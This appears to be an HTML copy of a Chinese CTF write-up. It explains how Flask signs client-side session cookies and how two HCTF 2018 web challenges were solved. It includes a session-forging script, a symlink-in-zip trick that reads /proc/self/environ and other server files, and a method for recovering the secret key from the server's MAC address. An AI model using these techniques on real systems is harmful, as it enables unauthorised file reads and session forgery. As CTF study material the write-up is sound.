@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="语言: CN /TW /HK 这次hctf中有两道获取flask的secret_key生成客户端session的题目，为了能做出这两道题目来也是深入研究了一下flask客户端session的生成机制。所以这篇文章主要详细讨论一下flask客户端session的生成以及校验过程，以及在了解了flask客户端session机制后这两道题的解法。 个人第一次见到关于客户端session的文章是pith0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从HCTF两道Web题谈谈flask客户端session机制">
+<meta property="og:url" content="https://westlake2014.github.io/2019/09/20/2019-09-20~dbda7a2134061ec788e7f9ae0bb8598c/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="语言: CN /TW /HK 这次hctf中有两道获取flask的secret_key生成客户端session的题目，为了能做出这两道题目来也是深入研究了一下flask客户端session的生成机制。所以这篇文章主要详细讨论一下flask客户端session的生成以及校验过程，以及在了解了flask客户端session机制后这两道题的解法。 个人第一次见到关于客户端session的文章是pith0">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-09-20T05:18:08.414Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="从HCTF两道Web题谈谈flask客户端session机制">
+<meta name="twitter:description" content="语言: CN /TW /HK 这次hctf中有两道获取flask的secret_key生成客户端session的题目，为了能做出这两道题目来也是深入研究了一下flask客户端session的生成机制。所以这篇文章主要详细讨论一下flask客户端session的生成以及校验过程，以及在了解了flask客户端session机制后这两道题的解法。 个人第一次见到关于客户端session的文章是pith0">
+  <link rel="canonical" href="https://westlake2014.github.io/2019/09/20/2019-09-20~dbda7a2134061ec788e7f9ae0bb8598c/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>从HCTF两道Web题谈谈flask客户端session机制 | Hexo</title>
+  <meta name="generator" content="Hexo 3.9.0">
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+  </ul>
+
+    
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://westlake2014.github.io/2019/09/20/2019-09-20~dbda7a2134061ec788e7f9ae0bb8598c/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="westlake2014">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">从HCTF两道Web题谈谈flask客户端session机制
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2019-09-20 00:00:00 / Modified: 01:18:08" itemprop="dateCreated datePublished" datetime="2019-09-20T00:00:00-04:00">2019-09-20</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>语言: <a href="https://www.jishuwen.com/d/24r2" target="_blank" rel="noopener">CN</a> /<br><a href="https://www.jishuwen.com/d/24r2/zh-tw" target="_blank" rel="noopener">TW</a> /<br><a href="https://www.jishuwen.com/d/24r2/zh-hk" target="_blank" rel="noopener">HK</a></p>
+<p>这次hctf中有两道获取flask的secret_key生成客户端session的题目，为了能做出这两道题目来也是深入研究了一下flask客户端session的生成机制。所以这篇文章主要详细讨论一下flask客户端session的生成以及校验过程，以及在了解了flask客户端session机制后这两道题的解法。</p>
+<p>个人第一次见到关于客户端session的文章是pith0n师傅的一片文章<br><a href="https://www.jishuwen.com/jump/aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vY2xpZW50LXNlc3Npb24tc2VjdXJpdHkuaHRtbA==" target="_blank" rel="noopener">客户端session导致的安全问题</a><br>。然而做题的时候只看phith0n师傅的这篇文章感觉还是有点儿懵逼。。。（也可能是我太菜了233）所以就只能翻flask的源码跟了一遍flask对session的处理流程。</p>
+<h2 id="flask对客户端session的处理机制"><a href="#flask对客户端session的处理机制" class="headerlink" title="flask对客户端session的处理机制"></a>flask对客户端session的处理机制</h2><p>flask对sess<a id="more"></a>ion的处理位于flask/sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p>
+<p>在flask/sessions.py中，SecureCookieSessionInterface用于封装对CookieSession的一系列操作：</p>
+<pre><code>class SecureCookieSessionInterface(SessionInterface):
+    &quot;&quot;&quot;The default session interface that stores sessions in signed cookies
+    through the :mod:`itsdangerous` module.
+    &quot;&quot;&quot;
+    # salt,默认为cookie-session
+    salt = &apos;cookie-session&apos;
+    #: 默认哈希函数为hashlib.sha1
+    digest_method = staticmethod(hashlib.sha1)
+    #:默认密钥推导方式 :hmac
+    key_derivation = &apos;hmac&apos;
+    #:默认序列化方式：session_json_serializer
+    serializer = session_json_serializer
+    session_class = SecureCookieSession</code></pre><p>这里默认的序列化方式的定义为:</p>
+<pre><code>session_json_serializer = TaggedJSONSerializer()</code></pre><p>可以看到默认使用taggedJSONSerializer做序列化</p>
+<p>taggedJSONSerializer定义：</p>
+<pre><code>class TaggedJSONSerializer(object):
+    &quot;&quot;&quot;A customized JSON serializer that supports a few extra types that
+    we take for granted when serializing (tuples, markup objects, datetime).
+    &quot;&quot;&quot;
+    def dumps(self, value):
+        def _tag(value):
+            if isinstance(value, tuple):
+                return {&apos; t&apos;: [_tag(x) for x in value]}
+            elif isinstance(value, uuid.UUID):
+                return {&apos; u&apos;: value.hex}
+            elif isinstance(value, bytes):
+                return {&apos; b&apos;: b64encode(value).decode(&apos;ascii&apos;)}
+            elif callable(getattr(value, &apos;__html__&apos;, None)):
+                return {&apos; m&apos;: text_type(value.__html__())}
+            elif isinstance(value, list):
+                return [_tag(x) for x in value]
+            elif isinstance(value, datetime):
+                return {&apos; d&apos;: http_date(value)}
+            elif isinstance(value, dict):
+                return dict((k, _tag(v)) for k, v in iteritems(value))
+            elif isinstance(value, str):
+                try:
+                    return text_type(value)
+                except UnicodeError:
+                    raise UnexpectedUnicodeError(u&apos;A byte string with &apos;
+                        u&apos;non-ASCII data was passed to the session system &apos;
+                        u&apos;which can only store unicode strings.  Consider &apos;
+                        u&apos;base64 encoding your string (String was %r)&apos; % value)
+            return value
+        return json.dumps(_tag(value), separators=(&apos;,&apos;, &apos;:&apos;))
+
+    def loads(self, value):
+        def object_hook(obj):
+            if len(obj) != 1:
+                return obj
+            the_key, the_value = next(iteritems(obj))
+            if the_key == &apos; t&apos;:
+                return tuple(the_value)
+            elif the_key == &apos; u&apos;:
+                return uuid.UUID(the_value)
+            elif the_key == &apos; b&apos;:
+                return b64decode(the_value)
+            elif the_key == &apos; m&apos;:
+                return Markup(the_value)
+            elif the_key == &apos; d&apos;:
+                return parse_date(the_value)
+            return obj
+        return json.loads(value, object_hook=object_hook)</code></pre><p>可以看到本质还是一个添加了类型属性的json处理。</p>
+<p>SecureCookieSessionInterface类的获取签名验证序列化器函数为get_signing_serializer</p>
+<pre><code>def get_signing_serializer(self, app):
+        if not app.secret_key:
+            return None
+        signer_kwargs = dict(
+            key_derivation=self.key_derivation,
+            digest_method=self.digest_method
+        )
+        return URLSafeTimedSerializer(app.secret_key, salt=self.salt,
+                                      serializer=self.serializer,
+                                      signer_kwargs=signer_kwargs)</code></pre><p>可以看到最后使用的签名序列化器为URLSafeTimedSerializer，并且传入app.secret_key用于签名。</p>
+<p>SecureCookieSessionInterface的open_session与save_session方法表示了对session的处理</p>
+<pre><code>def open_session(self, app, request):
+        s = self.get_signing_serializer(app)
+        if s is None:
+            return None
+        val = request.cookies.get(app.session_cookie_name)
+        if not val:
+            return self.session_class()
+        max_age = total_seconds(app.permanent_session_lifetime)
+        try:
+            data = s.loads(val, max_age=max_age)#max_age
+            return self.session_class(data)
+        except BadSignature:
+            return self.session_class()
+
+    def save_session(self, app, session, response):
+        domain = self.get_cookie_domain(app)
+        path = self.get_cookie_path(app)
+        if not session:
+            if session.modified:
+                response.delete_cookie(app.session_cookie_name,
+                                       domain=domain, path=path)
+            return
+        httponly = self.get_cookie_httponly(app)
+        secure = self.get_cookie_secure(app)
+        expires = self.get_expiration_time(app, session)
+        print self.get_signing_serializer(app)
+        val = self.get_signing_serializer(app).dumps(dict(session))
+        response.set_cookie(app.session_cookie_name, val,
+                            expires=expires, httponly=httponly,
+                            domain=domain, path=path, secure=secure)</code></pre><p>可以看到从客户端获取session时获取对应的cookie值，并使用序列化器序列化，能够成功序列化即可获取sesison_class,否则返回一个空的session_class.</p>
+<p>SecureCookieSession使用的默认序列化器URLSafeTimedSeriallizer位于itsdangerous模块中：</p>
+<pre><code>class URLSafeTimedSerializer(URLSafeSerializerMixin, TimedSerializer):
+    &quot;&quot;&quot;Works like :class:`TimedSerializer` but dumps and loads into a URL
+    safe string consisting of the upper and lowercase character of the
+    alphabet as well as ``&apos;_&apos;``, ``&apos;-&apos;`` and ``&apos;.&apos;``.
+    &quot;&quot;&quot;
+    default_serializer = compact_json</code></pre><p>序列化的流程在TimedSerializer的父类Serializer中</p>
+<pre><code>def dumps(self, obj, salt=None):
+        &quot;&quot;&quot;Returns a signed string serialized with the internal serializer.
+        The return value can be either a byte or unicode string depending
+        on the format of the internal serializer.
+        &quot;&quot;&quot;
+        payload = want_bytes(self.dump_payload(obj))
+        rv = self.make_signer(salt).sign(payload)
+        if self.is_text_serializer:
+            rv = rv.decode(&apos;utf-8&apos;)
+        return rv</code></pre><p>可以看到主要处理流程是将obj用dump_payload签名后利用make_signer(salt)生成的signer进行签名处理，并返回签名后的结果即为我们所需要的cookie值，而URLSafeTimedSeralizer的dump_playload方法继承自URLSafeSerializerMixin的dump_payload方法</p>
+<pre><code>def dump_payload(self, obj):
+        json = super(URLSafeSerializerMixin, self).dump_payload(obj)
+        is_compressed = False
+        compressed = zlib.compress(json)
+        if len(compressed) &lt; (len(json) - 1):
+            json = compressed
+            is_compressed = True
+        base64d = base64_encode(json)
+        if is_compressed:
+            base64d = b&apos;.&apos; + base64d
+        return base64d</code></pre><p>对obj的处理首先使用URLSafeTimedSeralizer的另一个父类TimedSeralizer继承自Seralizer的dump_payload方法处理</p>
+<pre><code>def dump_payload(self, obj):
+        &quot;&quot;&quot;Dumps the encoded object.  The return value is always a
+        bytestring.  If the internal serializer is text based the value
+        will automatically be encoded to utf-8.
+        &quot;&quot;&quot;
+        return want_bytes(self.serializer.dumps(obj))</code></pre><p>其中self.serializer为之前SecureCookieSessionInterface的get_signing_serializer传入，即taggedJSONSerializer。</p>
+<p>处理之后如果长度过长会进行一次zlib压缩，最后将生成的数据base64编码。</p>
+<p>再回到之前Seralizer的dumps的处理流程中，self.make_signer(salt)的定义如下:</p>
+<pre><code>def make_signer(self, salt=None):
+        &quot;&quot;&quot;A method that creates a new instance of the signer to be used.
+        The default implementation uses the :class:`Signer` baseclass.
+        &quot;&quot;&quot;
+        if salt is None:
+            salt = self.salt
+        return self.signer(self.secret_key, salt=salt, **self.signer_kwargs)</code></pre><p>self.salt、self.signer_kwargs、self.secret_key来自之前SecureCookieSessionInterface的get_signing_serializer传入，分别为app.secret_key、’cookie-session’、{‘key_derivation’:’hmac’,’digest_method’=staticmethod(hashlib.sha1)}，而self.signer为TimedSeralizer中指定</p>
+<pre><code>class TimedSerializer(Serializer):
+    &quot;&quot;&quot;Uses the :class:`TimestampSigner` instead of the default
+    :meth:`Signer`.
+    &quot;&quot;&quot;
+
+    default_signer = TimestampSigner</code></pre><p>TimestampSigner签名过程为：</p>
+<pre><code>def sign(self, value):
+        &quot;&quot;&quot;Signs the given string and also attaches a time information.&quot;&quot;&quot;
+        value = want_bytes(value)
+        timestamp = base64_encode(int_to_bytes(self.get_timestamp()))
+        sep = want_bytes(self.sep)
+        value = value + sep + timestamp
+        return value + sep + self.get_signature(value)</code></pre><p>将传入的value拼接上时间戳之后再拼接签名内容，签名实现继承自Signer类的get_signature方法</p>
+<pre><code>def get_signature(self, value):
+        &quot;&quot;&quot;Returns the signature for the given value&quot;&quot;&quot;
+        value = want_bytes(value)
+        key = self.derive_key()
+        sig = self.algorithm.get_signature(key, value)
+        return base64_encode(sig)</code></pre><p>因此，整个序列化的流程便是将obj处理为json格式后根据长度选择是否zlib压缩，之后再进行base64加密，拼接上当前时间戳之后再使用hmac签名并且拼接到该字符串上即为我们所需要的payload。</p>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反签名的流程主要为TimedSerializer类的loads函数</p>
+<pre><code>class TimedSerializer(Serializer):
+    &quot;&quot;&quot;Uses the :class:`TimestampSigner` instead of the default
+    :meth:`Signer`.
+    &quot;&quot;&quot;
+
+    default_signer = TimestampSigner
+
+    def loads(self, s, max_age=None, return_timestamp=False, salt=None):
+        &quot;&quot;&quot;Reverse of :meth:`dumps`, raises :exc:`BadSignature` if the
+        signature validation fails.  If a `max_age` is provided it will
+        ensure the signature is not older than that time in seconds.  In
+        case the signature is outdated, :exc:`SignatureExpired` is raised
+        which is a subclass of :exc:`BadSignature`.  All arguments are
+        forwarded to the signer&apos;s :meth:`~TimestampSigner.unsign` method.
+        &quot;&quot;&quot;
+        base64d, timestamp = self.make_signer(salt) 
+            .unsign(s, max_age, return_timestamp=True)
+        payload = self.load_payload(base64d)
+        if return_timestamp:
+            return payload, timestamp
+        return payload
+
+    def loads_unsafe(self, s, max_age=None, salt=None):
+        load_kwargs = {&apos;max_age&apos;: max_age}
+        load_payload_kwargs = {}
+        return self._loads_unsafe_impl(s, salt, load_kwargs, load_payload_kwargs)</code></pre><p>这里的loads部分使用TimestampSigner来对传入的数据进行解析，查看TimestampSinger中关于签名与反签名的源码：</p>
+<pre><code>def sign(self, value):
+        &quot;&quot;&quot;Signs the given string and also attaches a time information.&quot;&quot;&quot;
+        value = want_bytes(value)
+        timestamp = base64_encode(int_to_bytes(self.get_timestamp()))
+        sep = want_bytes(self.sep)
+        value = value + sep + timestamp
+        return value + sep + self.get_signature(value)
+
+       def unsign(self, value, max_age=None, return_timestamp=False):
+        &quot;&quot;&quot;Works like the regular :meth:`~Signer.unsign` but can also
+        validate the time.  See the base docstring of the class for
+        the general behavior.  If `return_timestamp` is set to `True`
+        the timestamp of the signature will be returned as naive
+        :class:`datetime.datetime` object in UTC.
+        &quot;&quot;&quot;
+        try:
+            result = Signer.unsign(self, value)
+            sig_error = None
+        except BadSignature as e:
+            sig_error = e
+            result = e.payload or b&apos;&apos;
+        sep = want_bytes(self.sep)
+
+        # If there is no timestamp in the result there is something
+        # seriously wrong.  In case there was a signature error, we raise
+        # that one directly, otherwise we have a weird situation in which
+        # we shouldn&apos;t have come except someone uses a time-based serializer
+        # on non-timestamp data, so catch that.
+        if not sep in result:
+            if sig_error:
+                raise sig_error
+            raise BadTimeSignature(&apos;timestamp missing&apos;, payload=result)
+
+        value, timestamp = result.rsplit(sep, 1)
+        try:
+            timestamp = bytes_to_int(base64_decode(timestamp))
+        except Exception:
+            timestamp = None
+
+        # Signature is *not* okay.  Raise a proper error now that we have
+        # split the value and the timestamp.
+        if sig_error is not None:
+            raise BadTimeSignature(text_type(sig_error), payload=value,
+                                   date_signed=timestamp)
+
+        # Signature was okay but the timestamp is actually not there or
+        # malformed.  Should not happen, but well.  We handle it nonetheless
+        #检查timestamp
+        if timestamp is None:
+            raise BadTimeSignature(&apos;Malformed timestamp&apos;, payload=value)
+
+        # Check timestamp is not older than max_age
+        if max_age is not None:
+            age = self.get_timestamp() - timestamp
+            if age &gt; max_age:
+                raise SignatureExpired(
+                    &apos;Signature age %s &gt; %s seconds&apos; % (age, max_age),
+                    payload=value,
+                    date_signed=self.timestamp_to_datetime(timestamp))
+
+        if return_timestamp:
+            return value, self.timestamp_to_datetime(timestamp)
+        return value</code></pre><p>unsigin过程直接调用父类Signer的unsign,再进行timestamp的检查，由于之前调用时传入了max_age所以会检查timestamp是否超时（当时没注意到这一点一直以为随便一个timestamp就可以结果gg了。。。）</p>
+<h3 id="序列化与反序列化的总结"><a href="#序列化与反序列化的总结" class="headerlink" title="序列化与反序列化的总结"></a>序列化与反序列化的总结</h3><p>最后经过flask处理的字符串的格式为：</p>
+<pre><code>json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</code></pre><p>对于以上的调用我们可以总结为这样的代码(与服务器上的python版本无关，如果不确定服务器运行环境timestamp最好根据服务器反馈获取)：</p>
+<pre><code>from itsdangerous import *
+from flask.sessions import *
+
+
+key=&apos;*******&apos;
+salt=&quot;cookie-session&quot;
+serializer=session_json_serializer
+digest_method=hashlib.sha1
+key_derivation=&apos;hmac&apos;
+
+signer_kwargs = dict(
+            key_derivation=key_derivation,
+            digest_method=digest_method
+        )
+
+
+def serialize(obj,timestamp,sep):
+        my_serializer=URLSafeTimedSerializer(key,salt=salt,serializer=serializer,signer_kwargs=signer_kwargs)
+        base64d=my_serializer.dump_payload(obj) #数据压缩
+        data=base64d+sep+timestamp #拼接timestamp
+        result=data+sep+my_serializer.make_signer(salt).get_signature(data) #拼接签名内容
+        return result</code></pre><p>而从cookie获取session的过程便是验证签名-&gt;验证是否过期-&gt;解码，解码可以使用phith0n师傅的payload：</p>
+<pre><code>#!/usr/bin/env python3
+import sys
+import zlib
+from base64 import b64decode
+from flask.sessions import session_json_serializer
+from itsdangerous import base64_decode
+
+def decryption(payload):
+    payload, sig = payload.rsplit(b&apos;.&apos;, 1)
+    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)
+
+    decompress = False
+    if payload.startswith(b&apos;.&apos;):
+        payload = payload[1:]
+        decompress = True
+
+    try:
+        payload = base64_decode(payload)
+    except Exception as e:
+        raise Exception(&apos;Could not base64 decode the payload because of &apos;
+                         &apos;an exception&apos;)
+
+    if decompress:
+        try:
+            payload = zlib.decompress(payload)
+        except Exception as e:
+            raise Exception(&apos;Could not zlib decompress the payload before &apos;
+                             &apos;decoding the payload&apos;)
+
+    return session_json_serializer.loads(payload)
+
+if __name__ == &apos;__main__&apos;:
+    print(decryption(sys.argv[1].encode()))</code></pre><p>需要特别注意的是python2与python3下产生的timestamp是不一样的！！！当时被这个问题坑了很久。。。</p>
+<h2 id="hctf两道题目的wp"><a href="#hctf两道题目的wp" class="headerlink" title="hctf两道题目的wp"></a>hctf两道题目的wp</h2><p>有了以上的分析要解决hctf的这两道题目就很容易了：</p>
+<p><a href="https://www.jishuwen.com/jump/aHR0cDovL2FkbWluLjIwMTguaGN0Zi5pby9pbmRleA==" target="_blank" rel="noopener">http://admin.2018.hctf.io/index</a></p>
+<p>这道题目我们能做出来是因为在github上搜索hctf,按照recent updated得到了题目的repo<br><a href="https://www.jishuwen.com/jump/aHR0cHM6Ly9naXRodWIuY29tL3dvYWRzbDEyMzQvaGN0Zl9mbGFzaw==" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask</a></p>
+<p>repo中暴露了私钥信息,而且题目只需要能用admin用户登入即可，因此可以直接使用上面的脚本跑出admin用户的session来。</p>
+<h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h3><p><a href="https://www.jishuwen.com/jump/aHR0cDovL2hpZGVhbmRzZWVrLjIwMTguaGN0Zi5pby8=" target="_blank" rel="noopener">http://hideandseek.2018.hctf.io/</a></p>
+<p>这道题目中登入后会要求我们上传一个zip文件,如果zip文件内的所有文件都是文本文件便可以成功返回文件的内容。</p>
+<p>然而zip文件中也可以包含软链接,采用zip -ry out.zip<br>link即可将一个软链接打包到out.zip中。因此我们可以尝试上传包含/proc/self/environ软链接的压缩包来获取一些运行环境信息</p>
+<pre><code>ln -s /proc/self/environ link
+zip -ry out.zip link</code></pre><p>上传后可以获得当前一些环境信息：</p>
+<p>可以发现uwsgi配置文件的路径/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini,尝试读取配置文件</p>
+<pre><code>[uwsgi]
+module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main
+callable=app</code></pre><p>可以得知当前脚本为/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</p>
+<p>从而获取到源码</p>
+<pre><code># -*- coding: utf-8 -*-
+from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
+import uuid
+import base64
+import random
+import flag
+from werkzeug.utils import secure_filename
+import os
+random.seed(uuid.getnode())
+app = Flask(__name__)
+app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)
+app.config[&apos;UPLOAD_FOLDER&apos;] = &apos;./uploads&apos;
+app.config[&apos;MAX_CONTENT_LENGTH&apos;] = 100 * 1024
+ALLOWED_EXTENSIONS = set([&apos;zip&apos;])
+
+def allowed_file(filename):
+    return &apos;.&apos; in filename and 
+           filename.rsplit(&apos;.&apos;, 1)[1].lower() in ALLOWED_EXTENSIONS
+
+
+@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])
+def index():
+    error = request.args.get(&apos;error&apos;, &apos;&apos;)
+    if(error == &apos;1&apos;):
+        session.pop(&apos;username&apos;, None)
+        return render_template(&apos;index.html&apos;, forbidden=1)
+
+    if &apos;username&apos; in session:
+        return render_template(&apos;index.html&apos;, user=session[&apos;username&apos;], flag=flag.flag)
+    else:
+        return render_template(&apos;index.html&apos;)
+
+
+@app.route(&apos;/login&apos;, methods=[&apos;POST&apos;])
+def login():
+    username=request.form[&apos;username&apos;]
+    password=request.form[&apos;password&apos;]
+    if request.method == &apos;POST&apos; and username != &apos;&apos; and password != &apos;&apos;:
+        if(username == &apos;admin&apos;):
+            return redirect(url_for(&apos;index&apos;,error=1))
+        session[&apos;username&apos;] = username
+    return redirect(url_for(&apos;index&apos;))
+
+
+@app.route(&apos;/logout&apos;, methods=[&apos;GET&apos;])
+def logout():
+    session.pop(&apos;username&apos;, None)
+    return redirect(url_for(&apos;index&apos;))
+
+@app.route(&apos;/upload&apos;, methods=[&apos;POST&apos;])
+def upload_file():
+    if &apos;the_file&apos; not in request.files:
+        return redirect(url_for(&apos;index&apos;))
+    file = request.files[&apos;the_file&apos;]
+    if file.filename == &apos;&apos;:
+        return redirect(url_for(&apos;index&apos;))
+    if file and allowed_file(file.filename):
+        filename = secure_filename(file.filename)
+        file_save_path = os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename)
+        if(os.path.exists(file_save_path)):
+            return &apos;This file already exists&apos;
+        file.save(file_save_path)
+    else:
+        return &apos;This file is not a zipfile&apos;
+
+
+    try:
+        extract_path = file_save_path + &apos;_&apos;
+        os.system(&apos;unzip -n &apos; + file_save_path + &apos; -d &apos;+ extract_path)
+        read_obj = os.popen(&apos;cat &apos; + extract_path + &apos;/*&apos;)
+        file = read_obj.read()
+        read_obj.close()
+        os.system(&apos;rm -rf &apos; + extract_path)
+    except Exception as e:
+        file = None
+
+    os.remove(file_save_path)
+    if(file != None):
+        if(file.find(base64.b64decode(&apos;aGN0Zg==&apos;).decode(&apos;utf-8&apos;)) != -1):
+            return redirect(url_for(&apos;index&apos;, error=1))
+    return Response(file)
+
+
+if __name__ == &apos;__main__&apos;:
+    #app.run(debug=True)
+    app.run(host=&apos;127.0.0.1&apos;, debug=True, port=10008)</code></pre><p>然而并无法获取flag.py的源码，因为限制了内容不能包含hctf。</p>
+<p>尝试获取/app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html</p>
+<p>可以得知只要能用admin登入即可获得flag.</p>
+<p>这里我们重点查看payload中SECRET_KEY的生成方式</p>
+<pre><code>random.seed(uuid.getnode())
+app = Flask(__name__)
+app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)</code></pre><p>可以看到随机数的种子为uuid.getnode().而uuid.getnode()函数返回的便是当前网卡的mac地址。那么要怎样获取服务器上的网卡地址?</p>
+<p>这里便可以通过linux强大的特殊文件系统来获取。首先利用之前的方法读取/proc/net/dev可以发现服务器上的所有网卡。可以发现服务器只有eth0和lo两个网卡。之后再读取/sys/class/net/eth0/address</p>
+<p>即可获取eth0网卡的mac地址。获取了地址，我们便获取了SECRET_KEY，之后便可以使用我们上面的payload来伪造session从二获取flag。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>通过这次hctf深入的了解了flask的客户端session的生成过程，可以说hctf相比最近的一些神仙大战确实是异常很适合web狗的比赛了。每年的hctf都能学到一些东西，希望以后能多一些这样干货满满的比赛。○|￣|_</p>
+<p>ps:如果出一道改了源码改了默认salt和签名机制的题目会不会被打死ヾ(≧∇≦*)ゝ</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/09/19/2019-09-19~3e2edfd6534e6566455d53083ebff55b/" rel="next" title="Webmin">
+                  <i class="fa fa-chevron-left"></i> Webmin
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
